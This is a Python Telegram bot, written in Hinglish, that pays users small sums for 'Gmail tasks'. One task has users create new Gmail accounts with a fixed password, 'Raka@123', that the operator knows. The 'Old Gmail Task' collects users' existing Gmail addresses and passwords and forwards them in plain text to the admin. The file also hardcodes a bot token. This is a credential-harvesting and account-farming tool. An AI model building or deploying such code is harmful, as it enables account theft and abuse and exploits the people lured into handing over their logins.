import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import datetime
import time

# --- CONFIGURATION ---
TOKEN = '8683212510:AAEdE8kq5-5GuKerfPa_Mzaxovgb-J5VU4w'
ADMIN_ID = 8894779077  
ADMIN_USERNAME = '@Raka_01 / @Verified_Bandaa' 

# Conversion Rate: 1 USDT = ₹94
USDT_TO_INR_RATE = 94.0  

bot = telebot.TeleBot(TOKEN)

# --- DATABASE SETUP ---
conn = sqlite3.connect('bot_database.db', check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''CREATE TABLE IF NOT EXISTS users
                  (user_id INTEGER PRIMARY KEY, balance REAL DEFAULT 0)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS history
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, type TEXT, amount REAL, detail TEXT, date TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_withdraws
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, method TEXT, address TEXT, amount REAL)''')
conn.commit()

user_states = {}

# --- HELPER FUNCTIONS ---
def get_balance(user_id):
    cursor.execute("SELECT balance FROM users WHERE user_id=?", (user_id,))
    result = cursor.fetchone()
    if result:
        return result[0]
    else:
        cursor.execute("INSERT INTO users (user_id, balance) VALUES (?, ?)", (user_id, 0))
        conn.commit()
        return 0

def add_balance(user_id, amount, detail):
    current = get_balance(user_id)
    new_balance = current + amount
    cursor.execute("UPDATE users SET balance=? WHERE user_id=?", (new_balance, user_id))
    date_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO history (user_id, type, amount, detail, date) VALUES (?, ?, ?, ?, ?)", 
                   (user_id, "CREDIT", amount, detail, date_now))
    conn.commit()

def deduct_balance(user_id, amount, detail):
    current = get_balance(user_id)
    new_balance = current - amount
    cursor.execute("UPDATE users SET balance=? WHERE user_id=?", (new_balance, user_id))
    date_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO history (user_id, type, amount, detail, date) VALUES (?, ?, ?, ?, ?)", 
                   (user_id, "DEBIT", amount, detail, date_now))
    conn.commit()

def get_all_users():
    cursor.execute("SELECT user_id FROM users")
    return [row[0] for row in cursor.fetchall()]

# --- MAIN MENU ---
def main_menu(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(KeyboardButton("📧 Gmail Task"), KeyboardButton("📧 Old Gmail Task"))
    markup.row(KeyboardButton("💰 Wallet"), KeyboardButton("💸 Withdraw"))
    markup.row(KeyboardButton("📞 Contact & Help"))
    if user_id == ADMIN_ID:
        markup.row(KeyboardButton("⚙️ Admin Panel"))
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    cursor.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,))
    is_new = cursor.fetchone() is None
    get_balance(user_id) 
    
    if is_new and user_id != ADMIN_ID:
        try:
            bot.send_message(ADMIN_ID, f"🚀 <b>New User Started Bot!</b>\n\n👤 <b>User ID:</b> <code>{user_id}</code>\n👤 <b>Name:</b> {message.from_user.first_name}", parse_mode="HTML")
        except:
            pass

    msg = (f"✨ <b>WELCOME TO OUR BOT!</b> ✨\n\n"
           f"Hello {message.from_user.first_name}, yahan aap simple tasks complete karke real cash earn kar sakte hain! 💸\n\n"
           f"👇 <b>Niche diye gaye buttons se apna task shuru karein:</b>")
    bot.send_message(user_id, msg, parse_mode="HTML", reply_markup=main_menu(user_id))

# --- MAIN TEXT & BROADCAST HANDLER ---
@bot.message_handler(content_types=['text', 'photo', 'video', 'document'])
def handle_all_messages(message):
    user_id = message.chat.id
    text = message.text if message.text else message.caption

    # 1. ADMIN BROADCAST CHECK
    if user_id in user_states and user_states[user_id].get('state') == 'admin_wait_broadcast' and user_id == ADMIN_ID:
        del user_states[user_id] # Clear state immediately so it doesn't loop
        bot.send_message(user_id, "⏳ <b>Broadcast Started...</b> Please wait.", parse_mode="HTML")
        
        users = get_all_users()
        success = 0
        failed = 0
        
        for u_id in users:
            try:
                bot.copy_message(chat_id=u_id, from_chat_id=user_id, message_id=message.message_id)
                success += 1
                time.sleep(0.04) # Anti-flood delay
            except Exception:
                failed += 1
                
        bot.send_message(user_id, f"✅ <b>Broadcast Complete!</b>\n\n🚀 Sent: {success}\n❌ Failed (Blocked): {failed}", parse_mode="HTML", reply_markup=main_menu(user_id))
        return

    # 2. SCREENSHOT CHECK FOR GMAIL TASK
    if user_id in user_states and user_states[user_id].get('state') == 'waiting_for_screenshot':
        if message.content_type == 'photo':
            file_id = message.photo[-1].file_id
            
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("✅ Approve", callback_data=f"apprt_{user_id}"),
                       InlineKeyboardButton("❌ Reject", callback_data=f"rejct_{user_id}"))
            
            admin_msg = f"🔔 <b>NEW GMAIL TASK SUBMISSION</b>\n\n👤 <b>User ID:</b> <code>{user_id}</code>\n\nPlease check screenshot."
            bot.send_photo(ADMIN_ID, file_id, caption=admin_msg, parse_mode="HTML", reply_markup=markup)
            
            bot.send_message(user_id, "✅ *Proof Submitted!*\nAapka screenshot Admin ko bhej diya gaya hai.", parse_mode="Markdown", reply_markup=main_menu(user_id))
            del user_states[user_id]
            return
        else:
            bot.send_message(user_id, "❌ Kripya valid **Screenshot (Photo)** bhejein!")
            return

    # 3. NORMAL TEXT MENU & STATES HANDLER
    if message.content_type == 'text':
        if text == "📧 Gmail Task":
            msg = ("📧 *GMAIL TASK*\n"
                   "💰 *Reward:* ₹15\n\n"
                   "⚠️ *Instructions & Rules:*\n"
                   "Rule - Create a new Gmail account.\n"
                   "Password must be - `Raka@123`\n\n"
                   "👉 *Complete the task and click the button below!*")
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("✅ Click Here When Done", callback_data="task_done"))
            markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
            bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=markup)

        elif text == "📧 Old Gmail Task":
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
            msg = ("📧 *OLD GMAIL TASK*\n\n"
                   "👉 Kripya apna valid **Old Gmail Account** yahan bhejein (jaise: `example@gmail.com`):")
            bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=markup)
            user_states[user_id] = {'state': 'old_gmail_email'}

        elif text == "💰 Wallet":
            balance_inr = get_balance(user_id)
            balance_usd = balance_inr / USDT_TO_INR_RATE
            
            msg = (f"💼 *YOUR WALLET*\n"
                   f"━━━━━━━━━━━━━━━━━━\n"
                   f"💵 *Balance:* ₹{balance_inr:.2f} / ${balance_usd:.2f} USD\n"
                   f"━━━━━━━━━━━━━━━━━━\n\n"
                   f"📊 *Recent Transactions:*\n")
            cursor.execute("SELECT type, amount, detail, date FROM history WHERE user_id=? ORDER BY id DESC LIMIT 5", (user_id,))
            records = cursor.fetchall()
            if not records:
                msg += "📝 _No history found yet._"
            for r in records:
                icon = "🟢" if r[0] == "CREDIT" else "🔴"
                r_usd = r[1] / USDT_TO_INR_RATE
                msg += f"{icon} *₹{r[1]} (${r_usd:.2f}u)* | {r[2]}\n📅 {r[3]}\n\n"
            bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=main_menu(user_id))

        elif text == "📞 Contact & Help":
            msg = ("📞 <b>CONTACT & SUPPORT</b>\n\n"
                   "Agar aapko koi problem aa rahi hai ya payment se related koi sawal hai, toh humare Admin se direct baat karein:\n\n"
                   f"👨‍💻 <b>Admin ID:</b> @{ADMIN_USERNAME}\n"
                   "💬 <i>Click on the username to send a message.</i>")
            bot.send_message(user_id, msg, parse_mode="HTML", reply_markup=main_menu(user_id))

        elif text == "💸 Withdraw":
            markup = ReplyKeyboardMarkup(resize_keyboard=True)
            markup.row(KeyboardButton("🏦 UPI"), KeyboardButton("🪙 USDT"))
            markup.row(KeyboardButton("📜 Withdraw History"), KeyboardButton("🔙 Back to Main"))
            msg = ("💸 *WITHDRAW FUNDS*\n\n"
                   "Apna preferred withdrawal method select karein:\n"
                   "🔹 *UPI* (Minimum ₹15)\n"
                   "🔹 *USDT* (Minimum $0.16)")
            bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=markup)
            
        elif text == "🔙 Back to Main":
            if user_id in user_states:
                del user_states[user_id]
            bot.send_message(user_id, "🏠 *Main Menu*", parse_mode="Markdown", reply_markup=main_menu(user_id))

        elif text in ["🏦 UPI", "🪙 USDT"]:
            balance_inr = get_balance(user_id)
            if text == "🏦 UPI":
                min_amount = 15.0
                if balance_inr < min_amount:
                    bot.send_message(user_id, f"❌ *Insufficient Balance!*\nMinimum withdrawal ke liye ₹{min_amount} chahiye.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                else:
                    bot.send_message(user_id, f"📝 Kripya apna withdrawal amount likhein in **INR (₹)** (Min: ₹15):", parse_mode="Markdown", reply_markup=telebot.types.ReplyKeyboardRemove())
                    user_states[user_id] = {'state': 'withdraw_amount', 'method': text}
            else:
                min_usd = 0.16
                min_inr = min_usd * USDT_TO_INR_RATE
                if balance_inr < min_inr:
                    bot.send_message(user_id, f"❌ *Insufficient Balance!*\nMinimum withdrawal ke liye ${min_usd} USD (₹{min_inr:.2f}) chahiye.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                else:
                    bot.send_message(user_id, f"📝 Kripya apna withdrawal amount likhein in **USDT ($)** (Min: $0.16):", parse_mode="Markdown", reply_markup=telebot.types.ReplyKeyboardRemove())
                    user_states[user_id] = {'state': 'withdraw_amount', 'method': text}

        elif text == "📜 Withdraw History":
            cursor.execute("SELECT detail, amount, date FROM history WHERE user_id=? AND type='DEBIT' ORDER BY id DESC LIMIT 10", (user_id,))
            records = cursor.fetchall()
            if not records:
                bot.send_message(user_id, "📝 _Aapki koi withdrawal history nahi hai._", parse_mode="Markdown", reply_markup=main_menu(user_id))
            else:
                msg = "📜 *WITHDRAWAL HISTORY:*\n\n"
                for r in records:
                    r_usd = r[1] / USDT_TO_INR_RATE
                    msg += f"🔴 *₹{r[1]} (${r_usd:.2f}u)* | {r[0]}\n📅 {r[2]}\n\n"
                bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=main_menu(user_id))

        elif text == "⚙️ Admin Panel" and user_id == ADMIN_ID:
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("📊 Total Users", callback_data="admin_total_users"))
            markup.row(InlineKeyboardButton("📢 Broadcast Message", callback_data="admin_broadcast"))
            markup.row(InlineKeyboardButton("💸 Add Balance to User", callback_data="admin_addbal"))
            markup.row(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
            bot.send_message(user_id, "🛠️ *ADMIN PANEL*\nKripya option select karein:", parse_mode="Markdown", reply_markup=markup)

        # --- DYNAMIC STATES ---
        elif user_id in user_states:
            state_data = user_states[user_id]
            
            if state_data['state'] == 'old_gmail_email':
                gmail_email = text.strip()
                if "@" not in gmail_email or not gmail_email.endswith("@gmail.com"):
                    bot.send_message(user_id, "❌ *Invalid Gmail Format!*\nKripya sahi format me gmail bhejein (Jaise: `yourname@gmail.com`). Dobara type karein:")
                    return

                user_states[user_id] = {'state': 'old_gmail_password', 'gmail_email': gmail_email}
                markup = InlineKeyboardMarkup()
                markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
                bot.send_message(user_id, f"✅ Email saved: <code>{gmail_email}</code>\n\n👉 Ab iska <b>Password</b> bhejein:", parse_mode="HTML", reply_markup=markup)

            elif state_data['state'] == 'old_gmail_password':
                gmail_pass = text.strip()
                gmail_email = state_data['gmail_email']
                
                bot.send_message(user_id, "✅ *Old Gmail Submitted!*\nAapka task Admin ke paas bhej diya gaya hai Checking Ka Wait Kare Processing Time 14-15Hrs Be Patient.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                
                markup = InlineKeyboardMarkup()
                markup.row(InlineKeyboardButton("✅ Approve", callback_data=f"oldappr_{user_id}"),
                           InlineKeyboardButton("❌ Reject", callback_data=f"oldrej_{user_id}"))
                
                admin_msg = (f"🔔 <b>NEW OLD GMAIL SUBMISSION</b>\n\n"
                             f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
                             f"📧 <b>Gmail:</b> <code>{gmail_email}</code>\n"
                             f"🔑 <b>Password:</b> <code>{gmail_pass}</code>")
                bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML", reply_markup=markup)
                del user_states[user_id]

            elif state_data['state'] == 'withdraw_amount':
                try:
                    input_val = float(text)
                    method = state_data['method']
                    balance_inr = get_balance(user_id)
                    
                    if method == "🏦 UPI":
                        amount_inr = input_val
                        min_val = 15.0
                        if amount_inr < min_val or amount_inr > balance_inr:
                            bot.send_message(user_id, "❌ *Invalid Amount!* Balance kam hai ya limit cross nahi hui.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                            del user_states[user_id]
                            return
                    else: 
                        amount_usd = input_val
                        amount_inr = amount_usd * USDT_TO_INR_RATE
                        min_val = 0.16
                        if amount_usd < min_val or amount_inr > balance_inr:
                            bot.send_message(user_id, "❌ *Invalid Amount!* Balance kam hai ya limit cross nahi hui.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                            del user_states[user_id]
                            return

                    user_states[user_id]['amount_inr'] = amount_inr
                    user_states[user_id]['display_amount'] = input_val
                    user_states[user_id]['state'] = 'withdraw_address'
                    
                    ask_str = "UPI ID" if method == "🏦 UPI" else "USDT (BEP20) Address"
                    markup = InlineKeyboardMarkup()
                    markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
                    bot.send_message(user_id, f"✅ Amount saved: {input_val} {'₹' if method == '🏦 UPI' else '$'}\n\n👉 Ab apna *{ask_str}* bhejein:", parse_mode="Markdown", reply_markup=markup)
                except ValueError:
                    bot.send_message(user_id, "❌ Sirf numbers mein amount likhein.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                    del user_states[user_id]

            elif state_data['state'] == 'withdraw_address':
                address = text.strip()
                method = state_data['method']
                
                if method == "🏦 UPI" and "@" not in address:
                    bot.send_message(user_id, "❌ *Invalid UPI ID!*\nSahi UPI ID dalein jisme '@' ho. Dobara bhejein:")
                    return
                    
                if method == "🪙 USDT" and (not address.startswith("0x") or len(address) < 30):
                    bot.send_message(user_id, "❌ *Invalid USDT Address!*\nAddress '0x' se start hona chahiye. Dobara bhejein:")
                    return

                amount_inr = state_data['amount_inr']
                display_amount = state_data['display_amount']
                
                deduct_balance(user_id, amount_inr, f"Pending {method} Withdraw ({display_amount})")
                cursor.execute("INSERT INTO pending_withdraws (user_id, method, address, amount) VALUES (?, ?, ?, ?)", 
                               (user_id, method, address, display_amount))
                pending_id = cursor.lastrowid
                conn.commit()
                
                bot.send_message(user_id, "✅ *Request Submitted!*\nAapka withdrawal request Admin ko bhej diya gaya hai.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                
                markup = InlineKeyboardMarkup()
                markup.row(InlineKeyboardButton("✅ Approve", callback_data=f"apprw_{pending_id}"),
                           InlineKeyboardButton("❌ Reject", callback_data=f"rejcc_{pending_id}"))
                
                curr_symbol = "₹" if method == "🏦 UPI" else "$"
                admin_msg = (f"🔔 <b>NEW WITHDRAW REQUEST</b>\n\n"
                             f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
                             f"🏦 <b>Method:</b> {method}\n"
                             f"💰 <b>Amount:</b> {curr_symbol}{display_amount}\n"
                             f"📌 <b>Address:</b> <code>{address}</code>")
                bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML", reply_markup=markup)
                del user_states[user_id]

            elif state_data['state'] == 'admin_wait_uid' and user_id == ADMIN_ID:
                try:
                    target_uid = int(text)
                    user_states[user_id] = {'state': 'admin_wait_amt', 'target_uid': target_uid}
                    bot.send_message(user_id, f"✅ User ID saved: `{target_uid}`\n\n👉 Ab *Amount (in ₹)* likhein jo add karna hai:", parse_mode="Markdown")
                except ValueError:
                    bot.send_message(user_id, "❌ User ID number format mein hona chahiye.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                    del user_states[user_id]

            elif state_data['state'] == 'admin_wait_amt' and user_id == ADMIN_ID:
                try:
                    amount = float(text)
                    target_uid = state_data['target_uid']
                    add_balance(target_uid, amount, "Bonus / Admin Added Balance")
                    
                    bot.send_message(user_id, f"✅ **Success!** ₹{amount} added to user `{target_uid}`.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                    try:
                        bot.send_message(target_uid, f"🎉 *Congratulations!*\nAdmin has added ₹{amount} to your wallet!", parse_mode="Markdown")
                    except:
                        pass 
                    del user_states[user_id]
                except ValueError:
                    bot.send_message(user_id, "❌ Amount number hona chahiye.", parse_mode="Markdown", reply_markup=main_menu(user_id))
                    del user_states[user_id]

# --- SECURED CALLBACK QUERIES ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.message.chat.id
    data = call.data

    if data == "back_to_main":
        if user_id in user_states:
            del user_states[user_id]
        try:
            bot.delete_message(user_id, call.message.message_id)
        except:
            pass
        bot.send_message(user_id, "🏠 *Main Menu*", parse_mode="Markdown", reply_markup=main_menu(user_id))

    elif data == "task_done":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
        bot.send_message(user_id, "📸 Kripya task complete karne ke baad **Screenshot (Photo)** bhejein:", parse_mode="Markdown", reply_markup=markup)
        user_states[user_id] = {'state': 'waiting_for_screenshot'}

    elif data == "admin_total_users" and user_id == ADMIN_ID:
        users = get_all_users()
        total = len(users)
        bot.answer_callback_query(call.id, f"Total Users: {total}", show_alert=True)

    elif data == "admin_broadcast" and user_id == ADMIN_ID:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
        bot.send_message(user_id, "📢 *Broadcast Mode*\n\nJo message sabko bhejna hai, wo bhejein (Text, Photo, Video etc):", parse_mode="Markdown", reply_markup=markup)
        user_states[user_id] = {'state': 'admin_wait_broadcast'}

    elif data == "admin_addbal" and user_id == ADMIN_ID:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
        bot.send_message(user_id, "💸 *Add Balance Mode*\n\n👉 User ka *Telegram ID* bhejein:", parse_mode="Markdown", reply_markup=markup)
        user_states[user_id] = {'state': 'admin_wait_uid'}

    elif data.startswith("oldappr_"):
        target_user = int(data.split("_")[1])
        bot.answer_callback_query(call.id, "Processing...")
        add_balance(target_user, 15.0, "Old Gmail Task Approved")
        try:
            bot.send_message(target_user, "🎉 *Old Gmail Approved!*\n₹15 aapke Wallet me add kar diye gaye hain.", parse_mode="Markdown")
        except: pass
        try:
            bot.edit_message_caption(f"✅ Old Gmail Approved for <code>{target_user}</code> (Done)", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=None)
        except:
            bot.edit_message_text(f"✅ Old Gmail Approved for <code>{target_user}</code> (Done)", call.message.chat.id, call.message.message_id, parse_mode="HTML")

    elif data.startswith("oldrej_"):
        target_user = int(data.split("_")[1])
        bot.answer_callback_query(call.id, "Processing...")
        try:
            bot.send_message(target_user, "❌ *Old Gmail Rejected!*\nAapka Old Gmail task reject kar diya gaya hai.", parse_mode="Markdown")
        except: pass
        try:
            bot.edit_message_caption(f"❌ Old Gmail Rejected for <code>{target_user}</code> (Done)", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=None)
        except:
            bot.edit_message_text(f"❌ Old Gmail Rejected for <code>{target_user}</code> (Done)", call.message.chat.id, call.message.message_id, parse_mode="HTML")

    elif data.startswith("apprt_"): 
        target_user = int(data.split("_")[1])
        bot.answer_callback_query(call.id, "Processing...")
        add_balance(target_user, 15.0, "Gmail Task Approved")
        try:
            bot.send_message(target_user, "🎉 *Task Approved!*\n₹15 aapke Wallet me add kar diye gaye hain.", parse_mode="Markdown")
        except: pass
        try:
            bot.edit_message_caption(f"✅ Task Approved for <code>{target_user}</code> (Done)", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=None)
        except:
            bot.edit_message_text(f"✅ Task Approved for <code>{target_user}</code> (Done)", call.message.chat.id, call.message.message_id, parse_mode="HTML")

    elif data.startswith("rejct_"): 
        target_user = int(data.split("_")[1])
        bot.answer_callback_query(call.id, "Processing...")
        try:
            bot.send_message(target_user, "❌ *Task Rejected!*\nAapka Gmail Task reject kar diya gaya hai Reason Aap Khud Check Karle Invalid.", parse_mode="Markdown")
        except: pass
        try:
            bot.edit_message_caption(f"❌ Task Rejected for <code>{target_user}</code> (Done)", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=None)
        except:
            bot.edit_message_text(f"❌ Task Rejected for <code>{target_user}</code> (Done)", call.message.chat.id, call.message.message_id, parse_mode="HTML")

    elif data.startswith("apprw_"): 
        pending_id = int(data.split("_")[1])
        cursor.execute("SELECT user_id, amount, method FROM pending_withdraws WHERE id=?", (pending_id,))
        req = cursor.fetchone()
        if req:
            target_user, display_amount, method = req
            curr_symbol = "₹" if method == "🏦 UPI" else "$"
            bot.answer_callback_query(call.id, "Processing...")
            try:
                bot.send_message(target_user, f"🎉 *Payment Sent!*\nAapka {method} withdrawal of {curr_symbol}{display_amount} successful ho gaya hai!", parse_mode="Markdown")
            except: pass
            try:
                bot.edit_message_text(f"✅ Withdrawal Approved for <code>{target_user}</code> (Done)", call.message.chat.id, call.message.message_id, parse_mode="HTML")
            except: pass
            cursor.execute("DELETE FROM pending_withdraws WHERE id=?", (pending_id,))
            conn.commit()
        else:
            bot.answer_callback_query(call.id, "⚠️ Already processed or invalid request!", show_alert=True)

    elif data.startswith("rejcc_"): 
        pending_id = int(data.split("_")[1])
        cursor.execute("SELECT user_id, amount, method FROM pending_withdraws WHERE id=?", (pending_id,))
        req = cursor.fetchone()
        if req:
            target_user, display_amount, method = req
            refund_inr = display_amount if method == "🏦 UPI" else display_amount * USDT_TO_INR_RATE
            
            bot.answer_callback_query(call.id, "Processing...")
            add_balance(target_user, refund_inr, f"Refund: {method} Withdraw Rejected")
            try:
                bot.send_message(target_user, f"❌ *Withdrawal Rejected!*\nAapka {method} withdrawal reject ho gaya hai. Balance wallet me refund ho gaya hai.", parse_mode="Markdown")
            except: pass
            try:
                bot.edit_message_text(f"❌ Withdrawal Rejected for <code>{target_user}</code> (Refunded)", call.message.chat.id, call.message.message_id, parse_mode="HTML")
            except: pass
            cursor.execute("DELETE FROM pending_withdraws WHERE id=?", (pending_id,))
            conn.commit()
        else:
            bot.answer_callback_query(call.id, "⚠️ Already processed or invalid request!", show_alert=True)

# --- START BOT ---
print("Bot with Fixed Broadcast & Approvals is running smoothly...")
bot.polling(none_stop=True)
